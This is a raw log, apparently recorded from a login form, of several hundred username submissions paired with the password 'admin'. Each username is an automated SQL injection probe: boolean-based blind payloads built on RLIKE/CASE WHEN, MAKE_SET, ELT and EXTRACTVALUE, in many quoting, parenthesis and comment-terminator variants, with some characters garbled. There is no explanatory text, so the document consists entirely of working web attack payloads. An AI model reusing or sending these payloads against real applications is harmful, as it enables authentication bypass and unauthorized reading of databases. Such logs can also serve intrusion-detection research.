+User Name:admin) RLIKE (SELECT (CASE WHEN (6409=3304) THEN 0x61646d696e ELSE 0x28 END)) AND (1605=1605Password:admin
+User Name:admin) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END)) AND (2393=2393Password:admin
+User Name:admin)) RLIKE (SELECT (CASE WHEN (4494=5750) THEN 0x61646d696e ELSE 0x28 END)) AND ((3231=3231Password:admin
+User Name:admin)) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END)) AND ((6277=6277Password:admin
+User Name:admin))) RLIKE (SELECT (CASE WHEN (8588=9395) THEN 0x61646d696e ELSE 0x28 END)) AND (((7618=7618Password:admin
+User Name:admin))) RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END)) AND (((2581=2581Password:admin
+User Name:admin RLIKE (SELECT (CASE WHEN (3134=4613) THEN 0x61646d696e ELSE 0x28 END))Password:admin
+User Name:admin RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))Password:admin
+User Name:admin RLIKE (SELECT (CASE WHEN (4245=3553) THEN 0x61646d696e ELSE 0x28 END))-- SEeAPassword:admin
+User Name:admin RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- WItjPassword:admin
+User Name:admin RLIKE (SELECT (CASE WHEN (5512=8318) THEN 0x61646d696e ELSE 0x28 END))# oAPgPassword:admin
+User Name:admin RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))# eXurPassword:admin
+User Name:admin)) AS nxoa WHERE 1695=1695 RLIKE (SELECT (CASE WHEN (6309=8295) THEN 0x61646d696e ELSE 0x28 END))-- SrKfPassword:admin
+User Name:admin)) AS FgQp WHERE 6915=6915 RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- YitcPassword:admin
+User Name:admin) AS oLik WHERE 5973=5973 RLIKE (SELECT (CASE WHEN (8572=7514) THEN 0x61646d696e ELSE 0x28 END))-- vOvEPassword:admin
+User Name:admin) AS DTwm WHERE 3293=3293 RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- JPBpPassword:admin
+User Name:admin` WHERE 5802=5802 RLIKE (SELECT (CASE WHEN (2067=6284) THEN 0x61646d696e ELSE 0x28 END))-- PQaNPassword:admin
+User Name:admin` WHERE 4791=4791 RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- FyGYPassword:admin
+User Name:admin`) WHERE 2731=2731 RLIKE (SELECT (CASE WHEN (4639=5243) THEN 0x61646d696e ELSE 0x28 END))-- KVZGPassword:admin
+User Name:admin`) WHERE 7922=7922 RLIKE (SELECT (CASE WHEN (7167=7167) THEN 0x61646d696e ELSE 0x28 END))-- ZqeMPassword:admin
+User Name:admin¿')9410,9410)-- bJjH¿'1Password:admin
+User Name:admin¿')8001,6526)-- HHrd¿'1Password:admin
+User Name:admin¿'3915,3915)-- GPPw¿'1Password:admin
+User Name:admin¿'8001,6526)-- yCSr¿'1Password:admin
+User Name:admin" AND MAKE_SET(7948=2993,2993)-- eyFmPassword:admin
+User Name:admin" AND MAKE_SET(8001=8001,6526)-- SJZKPassword:admin
+User Name:admin¿')3458,3458)'Iwbz¿'1Password:admin
+User Name:admin¿')8001,6526)'SLEu¿'1Password:admin
+User Name:admin¿'))6169,6169)'nKdK¿'1Password:admin
+User Name:admin¿'))8001,6526)'kpaO¿'1Password:admin
+User Name:admin¿')))2468,2468)'zlHg¿'1Password:admin
+User Name:admin¿')))8001,6526)'PKol¿'1Password:admin
+User Name:admin¿'1425,1425)'JmRE¿'1Password:admin
+User Name:admin¿'8001,6526)'dCgp¿'1Password:admin
+User Name:admin¿')1360,1360)'HXnk¿'1Password:admin
+User Name:admin¿')8001,6526)'swfd¿'1Password:admin
+User Name:admin¿'))6409,6409)'YTYg¿'1Password:admin
+User Name:admin¿'))8001,6526)'fGCi¿'1Password:admin
+User Name:admin¿')))3752,3752)'SUqm¿'1Password:admin
+User Name:admin¿')))8001,6526)'CkJD¿'1Password:admin
+User Name:admin%¿'3681,3681)'cQYm¿'1Password:admin
+User Name:admin%¿'8001,6526)'nkcG¿'1Password:admin
+User Name:admin¿'5524,5524)'lqJY¿'1Password:admin
+User Name:admin¿'8001,6526)'crHh¿'1Password:admin
+User Name:admin") AND MAKE_SET(9855=7455,7455) AND ("gvpZ"="gvpZPassword:admin
+User Name:admin") AND MAKE_SET(8001=8001,6526) AND ("htjK"="htjKPassword:admin
+User Name:admin")) AND MAKE_SET(3033=4806,4806) AND (("nsGf"="nsGfPassword:admin
+User Name:admin")) AND MAKE_SET(8001=8001,6526) AND (("sAmL"="sAmLPassword:admin
+User Name:admin"))) AND MAKE_SET(5268=9516,9516) AND ((("gmMm"="gmMmPassword:admin
+User Name:admin"))) AND MAKE_SET(8001=8001,6526) AND ((("vEFy"="vEFyPassword:admin
+User Name:admin" AND MAKE_SET(5856=9794,9794) AND "SsRM"="SsRMPassword:admin
+User Name:admin" AND MAKE_SET(8001=8001,6526) AND "gBhu"="gBhuPassword:admin
+User Name:admin") AND MAKE_SET(9801=9088,9088) AND ("zlQa" LIKE "zlQaPassword:admin
+User Name:admin") AND MAKE_SET(8001=8001,6526) AND ("dxWX" LIKE "dxWXPassword:admin
+User Name:admin")) AND MAKE_SET(3231=5847,5847) AND (("NGXT" LIKE "NGXTPassword:admin
+User Name:admin")) AND MAKE_SET(8001=8001,6526) AND (("JvWx" LIKE "JvWxPassword:admin
+User Name:admin"))) AND MAKE_SET(8118=2686,2686) AND ((("IddU" LIKE "IddUPassword:admin
+User Name:admin"))) AND MAKE_SET(8001=8001,6526) AND ((("vnMS" LIKE "vnMSPassword:admin
+User Name:admin" AND MAKE_SET(9265=5230,5230) AND "XXmJ" LIKE "XXmJPassword:admin
+User Name:admin" AND MAKE_SET(8001=8001,6526) AND "uaWy" LIKE "uaWyPassword:admin
+User Name:admin¿'8293,8293)'RTWX¿'1Password:admin
+User Name:admin¿'8001,6526)'EcTP¿'1Password:admin
+User Name:admin¿')) AS mEag WHERE 4290=42909093,9093)-- GZGR¿'1Password:admin
+User Name:admin¿')) AS Esud WHERE 2982=29828001,6526)-- TjIt¿'1Password:admin
+User Name:admin")) AS CXmG WHERE 9702=9702 AND MAKE_SET(6469=2476,2476)-- wQIVPassword:admin
+User Name:admin")) AS ZfXa WHERE 1586=1586 AND MAKE_SET(8001=8001,6526)-- mXVCPassword:admin
+User Name:admin¿') AS ZkKR WHERE 7300=73009110,9110)-- wWOE¿'1Password:admin
+User Name:admin¿') AS grGt WHERE 9898=98988001,6526)-- eizQ¿'1Password:admin
+User Name:admin") AS qMir WHERE 8787=8787 AND MAKE_SET(4724=5084,5084)-- IyvRPassword:admin
+User Name:admin") AS CwQr WHERE 8146=8146 AND MAKE_SET(8001=8001,6526)-- DlqMPassword:admin
+User Name:admin"="admin" AND MAKE_SET(3718=3566,3566) AND "admin"="adminPassword:admin
+User Name:admin"="admin" AND MAKE_SET(8001=8001,6526) AND "admin"="adminPassword:admin
+User Name:admin¿' IN BOOLEAN MODE)7761,7761)#¿'1Password:admin
+User Name:admin¿' IN BOOLEAN MODE)8001,6526)#¿'1Password:admin
+User Name:admin) AND MAKE_SET(5189=7717,7717)-- FUsHPassword:admin
+User Name:admin) AND MAKE_SET(8001=8001,6526)-- BfrWPassword:admin
+User Name:admin) AND MAKE_SET(1192=7217,7217) AND (8779=8779Password:admin
+User Name:admin) AND MAKE_SET(8001=8001,6526) AND (9256=9256Password:admin
+User Name:admin)) AND MAKE_SET(6161=4653,4653) AND ((5125=5125Password:admin
+User Name:admin)) AND MAKE_SET(8001=8001,6526) AND ((3985=3985Password:admin
+User Name:admin))) AND MAKE_SET(3457=7040,7040) AND (((6922=6922Password:admin
+User Name:admin))) AND MAKE_SET(8001=8001,6526) AND (((9511=9511Password:admin
+User Name:admin AND MAKE_SET(1485=5850,5850)Password:admin
+User Name:admin AND MAKE_SET(8001=8001,6526)Password:admin
+User Name:admin AND MAKE_SET(5779=6372,6372)-- miiQPassword:admin
+User Name:admin AND MAKE_SET(8001=8001,6526)-- WinlPassword:admin
+User Name:admin AND MAKE_SET(7312=1540,1540)# eIXRPassword:admin
+User Name:admin AND MAKE_SET(8001=8001,6526)# DdXbPassword:admin
+User Name:admin)) AS deND WHERE 7269=7269 AND MAKE_SET(9575=8066,8066)-- pyBiPassword:admin
+User Name:admin)) AS eJVv WHERE 7771=7771 AND MAKE_SET(8001=8001,6526)-- nozoPassword:admin
+User Name:admin) AS aWdG WHERE 5490=5490 AND MAKE_SET(9476=3252,3252)-- DMMPPassword:admin
+User Name:admin) AS EugA WHERE 8678=8678 AND MAKE_SET(8001=8001,6526)-- IXLjPassword:admin
+User Name:admin` WHERE 3283=3283 AND MAKE_SET(1666=7034,7034)-- PIXtPassword:admin
+User Name:admin` WHERE 4754=4754 AND MAKE_SET(8001=8001,6526)-- akrOPassword:admin
+User Name:admin`) WHERE 9922=9922 AND MAKE_SET(8129=3753,3753)-- OnwMPassword:admin
+User Name:admin`) WHERE 2704=2704 AND MAKE_SET(8001=8001,6526)-- xBIQPassword:admin
+User Name:admin`=`admin` AND MAKE_SET(7269=7475,7475) AND `admin`=`adminPassword:admin
+User Name:admin`=`admin` AND MAKE_SET(8001=8001,6526) AND `admin`=`adminPassword:admin
+User Name:admin]-(SELECT 0 WHERE 1674=1674 AND MAKE_SET(1030=2164,2164))|[adminPassword:admin
+User Name:admin]-(SELECT 0 WHERE 8567=8567 AND MAKE_SET(8001=8001,6526))|[adminPassword:admin
+User Name:-9632¿')3880,3880)-- xehv¿'1Password:admin
+User Name:-1861¿')8083,6077)-- anon¿'1Password:admin
+User Name:-3528¿')2899,2899)-- jilA¿'1Password:admin
+User Name:-5224¿'6397,6397)-- zQmQ¿'1Password:admin
+User Name:-8525¿'8083,6077)-- WKTu¿'1Password:admin
+User Name:-4332¿'1807,1807)-- oftr¿'1Password:admin
+User Name:-8629" OR MAKE_SET(2520=3053,3053)-- aHdBPassword:admin
+User Name:-9319" OR MAKE_SET(8083=8083,6077)-- EUxXPassword:admin
+User Name:-3015¿')5515,5515)'xcpD¿'1Password:admin
+User Name:-8241¿')8083,6077)'PwRl¿'1Password:admin
+User Name:-2721¿')7383,7383)'LomK¿'1Password:admin
+User Name:-9770¿'))6965,6965)'TpDj¿'1Password:admin
+User Name:-7268¿'))8083,6077)'MGGs¿'1Password:admin
+User Name:-9740¿'))6543,6543)'dRIa¿'1Password:admin
+User Name:-3798¿')))9078,9078)'bNSN¿'1Password:admin
+User Name:-1822¿')))8083,6077)'qXpg¿'1Password:admin
+User Name:-3454¿')))5996,5996)'AqMC¿'1Password:admin
+User Name:-4250¿'7461,7461)'ViWy¿'1Password:admin
+User Name:-9939¿'8083,6077)'GLvi¿'1Password:admin
+User Name:-1733¿'1620,1620)'CgND¿'1Password:admin
+User Name:-2448¿')1932,1932)'hbEf¿'1Password:admin
+User Name:-6827¿')8083,6077)'KOHR¿'1Password:admin
+User Name:-6255¿')4977,4977)'WNKT¿'1Password:admin
+User Name:-2837¿'))6860,6860)'pidW¿'1Password:admin
+User Name:-3330¿'))8083,6077)'xqih¿'1Password:admin
+User Name:-5480¿'))6698,6698)'lQjW¿'1Password:admin
+User Name:-7626¿')))5151,5151)'xWtm¿'1Password:admin
+User Name:-5975¿')))8083,6077)'iSwv¿'1Password:admin
+User Name:-8696¿')))9052,9052)'wwxh¿'1Password:admin
+User Name:-2742%¿'5434,5434)'yABP¿'1Password:admin
+User Name:-7020%¿'8083,6077)'FOpT¿'1Password:admin
+User Name:-9835%¿'9338,9338)'sghj¿'1Password:admin
+User Name:-5309¿'1620,1620)'pTfs¿'1Password:admin
+User Name:-4444¿'8083,6077)'cXre¿'1Password:admin
+User Name:-5861¿'1678,1678)'JRMk¿'1Password:admin
+User Name:-3235") OR MAKE_SET(6578=5333,5333) AND ("hNUb"="hNUbPassword:admin
+User Name:-4019") OR MAKE_SET(8083=8083,6077) AND ("NOIo"="NOIoPassword:admin
+User Name:-6036")) OR MAKE_SET(5868=8732,8732) AND (("PDWr"="PDWrPassword:admin
+User Name:-7251")) OR MAKE_SET(8083=8083,6077) AND (("PfAm"="PfAmPassword:admin
+User Name:-6381"))) OR MAKE_SET(6489=8778,8778) AND ((("GFKz"="GFKzPassword:admin
+User Name:-4398"))) OR MAKE_SET(8083=8083,6077) AND ((("KBFz"="KBFzPassword:admin
+User Name:-6980" OR MAKE_SET(6423=9550,9550) AND "Kxlw"="KxlwPassword:admin
+User Name:-1671" OR MAKE_SET(8083=8083,6077) AND "lSPL"="lSPLPassword:admin
+User Name:-4403") OR MAKE_SET(9351=7448,7448) AND ("ccid" LIKE "ccidPassword:admin
+User Name:-4820") OR MAKE_SET(8083=8083,6077) AND ("ieeb" LIKE "ieebPassword:admin
+User Name:-8428")) OR MAKE_SET(5242=8099,8099) AND (("XrfJ" LIKE "XrfJPassword:admin
+User Name:-1802")) OR MAKE_SET(8083=8083,6077) AND (("Lvrg" LIKE "LvrgPassword:admin
+User Name:-8921"))) OR MAKE_SET(4116=7204,7204) AND ((("GobE" LIKE "GobEPassword:admin
+User Name:-8662"))) OR MAKE_SET(8083=8083,6077) AND ((("htnM" LIKE "htnMPassword:admin
+User Name:-5460" OR MAKE_SET(5452=7256,7256) AND "kCli" LIKE "kCliPassword:admin
+User Name:-5040" OR MAKE_SET(8083=8083,6077) AND "WIpi" LIKE "WIpiPassword:admin
+User Name:-2209¿'7241,7241)'WmuB¿'1Password:admin
+User Name:-2644¿'8083,6077)'MQqg¿'1Password:admin
+User Name:-3579¿'3681,3681)'lPjq¿'1Password:admin
+User Name:-6849¿')) AS pQuL WHERE 8980=89809634,9634)-- XRjs¿'1Password:admin
+User Name:-9162¿')) AS yRju WHERE 9221=92218083,6077)-- yjbT¿'1Password:admin
+User Name:-5436¿')) AS Zsvc WHERE 3972=39721358,1358)-- vPwM¿'1Password:admin
+User Name:-2563")) AS evUr WHERE 3495=3495 OR MAKE_SET(5452=9984,9984)-- pDqvPassword:admin
+User Name:-9837")) AS cBcr WHERE 8561=8561 OR MAKE_SET(8083=8083,6077)-- aDzCPassword:admin
+User Name:-8862¿') AS OvNg WHERE 9556=95561865,1865)-- hCki¿'1Password:admin
+User Name:-7693¿') AS kSmX WHERE 8672=86728083,6077)-- PKUr¿'1Password:admin
+User Name:-1481¿') AS yNTZ WHERE 3920=39205290,5290)-- tqsh¿'1Password:admin
+User Name:-5781") AS fACq WHERE 6084=6084 OR MAKE_SET(9858=9929,9929)-- GHHuPassword:admin
+User Name:-6178") AS YiYU WHERE 2264=2264 OR MAKE_SET(8083=8083,6077)-- GBFSPassword:admin
+User Name:-2801) OR MAKE_SET(5444=8083,8083)-- TZdIPassword:admin
+User Name:-7060) OR MAKE_SET(8083=8083,6077)-- rthpPassword:admin
+User Name:-9972) OR MAKE_SET(5362=8190,8190) AND (5720=5720Password:admin
+User Name:-8379) OR MAKE_SET(8083=8083,6077) AND (8714=8714Password:admin
+User Name:-8531)) OR MAKE_SET(9193=8632,8632) AND ((3211=3211Password:admin
+User Name:-8280)) OR MAKE_SET(8083=8083,6077) AND ((8642=8642Password:admin
+User Name:-1011))) OR MAKE_SET(2057=2132,2132) AND (((8831=8831Password:admin
+User Name:-1706))) OR MAKE_SET(8083=8083,6077) AND (((7897=7897Password:admin
+User Name:-4216 OR MAKE_SET(4948=3100,3100)Password:admin
+User Name:-8889 OR MAKE_SET(8083=8083,6077)Password:admin
+User Name:-3674 OR MAKE_SET(1834=1086,1086)-- tWwnPassword:admin
+User Name:-3280 OR MAKE_SET(8083=8083,6077)-- OtANPassword:admin
+User Name:-8323 OR MAKE_SET(8152=5572,5572)# nFxqPassword:admin
+User Name:-1025 OR MAKE_SET(8083=8083,6077)# siqRPassword:admin
+User Name:-7486)) AS lNmY WHERE 4686=4686 OR MAKE_SET(3003=2356,2356)-- bNaKPassword:admin
+User Name:-4427)) AS XiLd WHERE 6130=6130 OR MAKE_SET(8083=8083,6077)-- fHnXPassword:admin
+User Name:-1118) AS fhZa WHERE 3829=3829 OR MAKE_SET(1393=1010,1010)-- GXJCPassword:admin
+User Name:-7039) AS RTlJ WHERE 5993=5993 OR MAKE_SET(8083=8083,6077)-- GQUnPassword:admin
+User Name:admin¿')7756,7756)-- wfMr¿'1Password:admin
+User Name:admin¿')5628,5409)-- TniI¿'1Password:admin
+User Name:admin¿'9976,9976)-- APPB¿'1Password:admin
+User Name:admin¿'5628,5409)-- gmfE¿'1Password:admin
+User Name:admin" AND ELT(5104=2785,2785)-- ddOXPassword:admin
+User Name:admin" AND ELT(5628=5628,5409)-- YvrxPassword:admin
+User Name:admin¿')6232,6232)'isTo¿'1Password:admin
+User Name:admin¿')5628,5409)'PfWZ¿'1Password:admin
+User Name:admin¿'))1028,1028)'AwiA¿'1Password:admin
+User Name:admin¿'))5628,5409)'NVAt¿'1Password:admin
+User Name:admin¿')))4276,4276)'aBBh¿'1Password:admin
+User Name:admin¿')))5628,5409)'knyi¿'1Password:admin
+User Name:admin¿'3523,3523)'bFwC¿'1Password:admin
+User Name:admin¿'5628,5409)'BmiX¿'1Password:admin
+User Name:admin¿')4821,4821)'KpxK¿'1Password:admin
+User Name:admin¿')5628,5409)'zRcV¿'1Password:admin
+User Name:admin¿'))8635,8635)'pjDw¿'1Password:admin
+User Name:admin¿'))5628,5409)'CooV¿'1Password:admin
+User Name:admin¿')))4041,4041)'KudN¿'1Password:admin
+User Name:admin¿')))5628,5409)'VWtz¿'1Password:admin
+User Name:admin%¿'8183,8183)'TpAX¿'1Password:admin
+User Name:admin%¿'5628,5409)'vlDE¿'1Password:admin
+User Name:admin¿'9251,9251)'jKpT¿'1Password:admin
+User Name:admin¿'5628,5409)'tSgc¿'1Password:admin
+User Name:admin") AND ELT(6744=6744,6744) AND ("PIEI"="PIEIPassword:admin
+User Name:admin") AND ELT(5628=5628,5409) AND ("tnGt"="tnGtPassword:admin
+User Name:admin")) AND ELT(5093=1263,1263) AND (("nmps"="nmpsPassword:admin
+User Name:admin")) AND ELT(5628=5628,5409) AND (("TBLw"="TBLwPassword:admin
+User Name:admin"))) AND ELT(6100=4625,4625) AND ((("bwTB"="bwTBPassword:admin
+User Name:admin"))) AND ELT(5628=5628,5409) AND ((("fPsO"="fPsOPassword:admin
+User Name:admin" AND ELT(4153=6104,6104) AND "KnLg"="KnLgPassword:admin
+User Name:admin" AND ELT(5628=5628,5409) AND "KfhL"="KfhLPassword:admin
+User Name:admin") AND ELT(4664=3530,3530) AND ("Stmj" LIKE "StmjPassword:admin
+User Name:admin") AND ELT(5628=5628,5409) AND ("qXaG" LIKE "qXaGPassword:admin
+User Name:admin")) AND ELT(8889=9775,9775) AND (("jTau" LIKE "jTauPassword:admin
+User Name:admin")) AND ELT(5628=5628,5409) AND (("Kufw" LIKE "KufwPassword:admin
+User Name:admin"))) AND ELT(3640=5499,5499) AND ((("yoqN" LIKE "yoqNPassword:admin
+User Name:admin"))) AND ELT(5628=5628,5409) AND ((("iNpj" LIKE "iNpjPassword:admin
+User Name:admin" AND ELT(9170=5000,5000) AND "OCeb" LIKE "OCebPassword:admin
+User Name:admin" AND ELT(5628=5628,5409) AND "jucQ" LIKE "jucQPassword:admin
+User Name:admin¿'4121,4121)'PSMr¿'1Password:admin
+User Name:admin¿'5628,5409)'Kmmi¿'1Password:admin
+User Name:admin¿')) AS WLLP WHERE 3491=34916123,6123)-- DJMG¿'1Password:admin
+User Name:admin¿')) AS TmoZ WHERE 5741=57415628,5409)-- Dnzk¿'1Password:admin
+User Name:admin")) AS xxQQ WHERE 3583=3583 AND ELT(5673=2629,2629)-- mDbuPassword:admin
+User Name:admin")) AS jubw WHERE 1082=1082 AND ELT(5628=5628,5409)-- cvJLPassword:admin
+User Name:admin¿') AS OGGZ WHERE 6168=61683222,3222)-- DqcB¿'1Password:admin
+User Name:admin¿') AS BNch WHERE 4776=47765628,5409)-- USUl¿'1Password:admin
+User Name:admin") AS buOP WHERE 5804=5804 AND ELT(1597=6867,6867)-- oxjBPassword:admin
+User Name:admin") AS acox WHERE 4196=4196 AND ELT(5628=5628,5409)-- dKYRPassword:admin
+User Name:admin"="admin" AND ELT(4941=9407,9407) AND "admin"="adminPassword:admin
+User Name:admin"="admin" AND ELT(5628=5628,5409) AND "admin"="adminPassword:admin
+User Name:admin¿' IN BOOLEAN MODE)8668,8668)#¿'1Password:admin
+User Name:admin¿' IN BOOLEAN MODE)5628,5409)#¿'1Password:admin
+User Name:admin) AND ELT(7522=5077,5077)-- HtokPassword:admin
+User Name:admin) AND ELT(5628=5628,5409)-- NvoAPassword:admin
+User Name:admin) AND ELT(4081=8678,8678) AND (9566=9566Password:admin
+User Name:admin) AND ELT(5628=5628,5409) AND (7018=7018Password:admin
+User Name:admin)) AND ELT(2667=6917,6917) AND ((9551=9551Password:admin
+User Name:admin)) AND ELT(5628=5628,5409) AND ((9875=9875Password:admin
+User Name:admin))) AND ELT(1018=6313,6313) AND (((8534=8534Password:admin
+User Name:admin))) AND ELT(5628=5628,5409) AND (((1852=1852Password:admin
+User Name:admin AND ELT(4580=1422,1422)Password:admin
+User Name:admin AND ELT(5628=5628,5409)Password:admin
+User Name:admin AND ELT(4761=6561,6561)-- xuCDPassword:admin
+User Name:admin AND ELT(5628=5628,5409)-- DNfMPassword:admin
+User Name:admin AND ELT(8690=6055,6055)# TIuUPassword:admin
+User Name:admin AND ELT(5628=5628,5409)# BZxLPassword:admin
+User Name:admin)) AS tscW WHERE 8907=8907 AND ELT(9813=9372,9372)-- JnKkPassword:admin
+User Name:admin)) AS KEAE WHERE 5112=5112 AND ELT(5628=5628,5409)-- PJopPassword:admin
+User Name:admin) AS ieyX WHERE 3944=3944 AND ELT(6300=5132,5132)-- SpbpPassword:admin
+User Name:admin) AS puFC WHERE 9570=9570 AND ELT(5628=5628,5409)-- JloePassword:admin
+User Name:admin` WHERE 7763=7763 AND ELT(6912=2934,2934)-- buqvPassword:admin
+User Name:admin` WHERE 6731=6731 AND ELT(5628=5628,5409)-- SkrVPassword:admin
+User Name:admin`) WHERE 8738=8738 AND ELT(6765=2246,2246)-- fZeLPassword:admin
+User Name:admin`) WHERE 3846=3846 AND ELT(5628=5628,5409)-- iBPXPassword:admin
+User Name:admin`=`admin` AND ELT(2598=8808,8808) AND `admin`=`adminPassword:admin
+User Name:admin`=`admin` AND ELT(5628=5628,5409) AND `admin`=`adminPassword:admin
+User Name:admin]-(SELECT 0 WHERE 4740=4740 AND ELT(9917=7356,7356))|[adminPassword:admin
+User Name:admin]-(SELECT 0 WHERE 5246=5246 AND ELT(5628=5628,5409))|[adminPassword:admin
+User Name:-4488¿')9729,9729)-- XXOY¿'1Password:admin
+User Name:-3314¿')5229,1397)-- MIXi¿'1Password:admin
+User Name:-2518¿')8727,8727)-- aXnK¿'1Password:admin
+User Name:-7854¿'5224,5224)-- YhRT¿'1Password:admin
+User Name:-3536¿'5229,1397)-- gEhB¿'1Password:admin
+User Name:-1905¿'5928,5928)-- ZmKb¿'1Password:admin
+User Name:-4534" OR ELT(1812=4081,4081)-- WvfzPassword:admin
+User Name:-8608" OR ELT(5229=5229,1397)-- SfTrPassword:admin
+User Name:-8137¿')6516,6516)'itll¿'1Password:admin
+User Name:-8231¿')5229,1397)'lZyd¿'1Password:admin
+User Name:-3221¿')2769,2769)'iKlM¿'1Password:admin
+User Name:-2486¿'))6479,6479)'FbAP¿'1Password:admin
+User Name:-1712¿'))5229,1397)'wRXi¿'1Password:admin
+User Name:-6158¿'))1559,1559)'aTTA¿'1Password:admin
+User Name:-3946¿')))5513,5513)'dIBu¿'1Password:admin
+User Name:-3487¿')))5229,1397)'pQTE¿'1Password:admin
+User Name:-3292¿')))5012,5012)'fOJV¿'1Password:admin
+User Name:-6846¿'6847,6847)'QiMI¿'1Password:admin
+User Name:-8264¿'5229,1397)'FOEi¿'1Password:admin
+User Name:-6639¿'7603,7603)'CEeG¿'1Password:admin
+User Name:-9777¿')7349,7349)'ICBe¿'1Password:admin
+User Name:-5269¿')5229,1397)'LrqT¿'1Password:admin
+User Name:-2617¿')8177,8177)'XLiz¿'1Password:admin
+User Name:-2482¿'))3935,3935)'OYae¿'1Password:admin
+User Name:-3433¿'))5229,1397)'NrfU¿'1Password:admin
+User Name:-5012¿'))6576,6576)'RjFE¿'1Password:admin
+User Name:-1280¿')))5476,5476)'MTvg¿'1Password:admin
+User Name:-4603¿')))5229,1397)'WApx¿'1Password:admin
+User Name:-5698¿')))7985,7985)'bGWS¿'1Password:admin
+User Name:-4449%¿'7336,7336)'qITI¿'1Password:admin
+User Name:-7860%¿'5229,1397)'dqPu¿'1Password:admin
+User Name:-6269%¿'7916,7916)'ElcX¿'1Password:admin
+User Name:-3834¿'7305,7305)'eTWz¿'1Password:admin
+User Name:-7497¿'5229,1397)'LQpf¿'1Password:admin
+User Name:-7952¿'3999,3999)'AhcC¿'1Password:admin
+User Name:-3340") OR ELT(3722=1705,1705) AND ("Lqij"="LqijPassword:admin
+User Name:-7436") OR ELT(5229=5229,1397) AND ("TpWU"="TpWUPassword:admin
+User Name:-2824")) OR ELT(7406=8800,8800) AND (("MVaK"="MVaKPassword:admin
+User Name:-8936")) OR ELT(5229=5229,1397) AND (("QRAo"="QRAoPassword:admin
+User Name:-5848"))) OR ELT(7433=8394,8394) AND ((("XSgf"="XSgfPassword:admin
+User Name:-2510"))) OR ELT(5229=5229,1397) AND ((("ujIv"="ujIvPassword:admin
+User Name:-7369" OR ELT(5781=4493,4493) AND "uKRH"="uKRHPassword:admin
+User Name:-3362" OR ELT(5229=5229,1397) AND "iDfa"="iDfaPassword:admin
+User Name:-5271") OR ELT(8143=7706,7706) AND ("fcKm" LIKE "fcKmPassword:admin
+User Name:-2162") OR ELT(5229=5229,1397) AND ("fbSM" LIKE "fbSMPassword:admin
+User Name:-5555")) OR ELT(4008=2442,2442) AND (("cyNg" LIKE "cyNgPassword:admin
+User Name:-9229")) OR ELT(5229=5229,1397) AND (("tAMd" LIKE "tAMdPassword:admin
+User Name:-2542"))) OR ELT(5211=2373,2373) AND ((("bycC" LIKE "bycCPassword:admin
+User Name:-8045"))) OR ELT(5229=5229,1397) AND ((("arpR" LIKE "arpRPassword:admin
+User Name:-7547" OR ELT(3327=6575,6575) AND "WDsH" LIKE "WDsHPassword:admin
+User Name:-7549" OR ELT(5229=5229,1397) AND "mieu" LIKE "mieuPassword:admin
+User Name:-9990¿'8827,8827)'snbC¿'1Password:admin
+User Name:-6353¿'5229,1397)'TLwV¿'1Password:admin
+User Name:-3902¿'2345,2345)'VUFC¿'1Password:admin
+User Name:-1146¿')) AS kRQd WHERE 2399=23999832,9832)-- Gdks¿'1Password:admin
+User Name:-4738¿')) AS cgXQ WHERE 4302=43025229,1397)-- dJsY¿'1Password:admin
+User Name:-3613¿')) AS aEAE WHERE 8752=87525272,5272)-- ptyC¿'1Password:admin
+User Name:-2401")) AS djmA WHERE 4303=4303 OR ELT(1881=9239,9239)-- ISFpPassword:admin
+User Name:-8720")) AS gHUl WHERE 3775=3775 OR ELT(5229=5229,1397)-- EStPPassword:admin
+User Name:-7747¿') AS GQXC WHERE 9653=96537191,7191)-- WQuc¿'1Password:admin
+User Name:-3941¿') AS tQih WHERE 4635=46355229,1397)-- KyWr¿'1Password:admin
+User Name:-6958¿') AS uqQc WHERE 7858=78586511,6511)-- YWOc¿'1Password:admin
+User Name:-2415") AS RhOG WHERE 9926=9926 OR ELT(9065=7517,7517)-- kQYGPassword:admin
+User Name:-2923") AS qAYE WHERE 8236=8236 OR ELT(5229=5229,1397)-- OpvEPassword:admin
+User Name:-7404) OR ELT(3494=5150,5150)-- HiWePassword:admin
+User Name:-5196) OR ELT(5229=5229,1397)-- TNbdPassword:admin
+User Name:-9992) OR ELT(8175=4190,4190) AND (4131=4131Password:admin
+User Name:-4909) OR ELT(5229=5229,1397) AND (9386=9386Password:admin
+User Name:-1607)) OR ELT(4319=2698,2698) AND ((2087=2087Password:admin
+User Name:-1449)) OR ELT(5229=5229,1397) AND ((7471=7471Password:admin
+User Name:-7538))) OR ELT(4104=2536,2536) AND (((5053=5053Password:admin
+User Name:-8427))) OR ELT(5229=5229,1397) AND (((5122=5122Password:admin
+User Name:-6119 OR ELT(9425=4383,4383)Password:admin
+User Name:-5616 OR ELT(5229=5229,1397)Password:admin
+User Name:-8587 OR ELT(6175=2784,2784)-- uDhmPassword:admin
+User Name:-2270 OR ELT(5229=5229,1397)-- FkZfPassword:admin
+User Name:-8690 OR ELT(5499=5515,5515)# WqTJPassword:admin
+User Name:-6326 OR ELT(5229=5229,1397)# YlkcPassword:admin
+User Name:-6409)) AS cCCg WHERE 7092=7092 OR ELT(5072=2209,2209)-- wUBIPassword:admin
+User Name:-1396)) AS NPjd WHERE 5499=5499 OR ELT(5229=5229,1397)-- mSYlPassword:admin
+User Name:-7006) AS NeTJ WHERE 5987=5987 OR ELT(7873=7239,7239)-- LRmzPassword:admin
+User Name:-9198) AS hZdG WHERE 4194=4194 OR ELT(5229=5229,1397)-- ygaQPassword:admin
+User Name:admin¿') AND EXTRACTVALUE(1964,CASE WHEN (1964=3873) THEN 1964 ELSE 0x3A END)-- ppvGPassword:admin
+User Name:admin¿') AND EXTRACTVALUE(3669,CASE WHEN (3669=3669) THEN 3669 ELSE 0x3A END)-- MaEOPassword:admin
+User Name:admin¿' AND EXTRACTVALUE(4183,CASE WHEN (4183=3079) THEN 4183 ELSE 0x3A END)-- YbcCPassword:admin
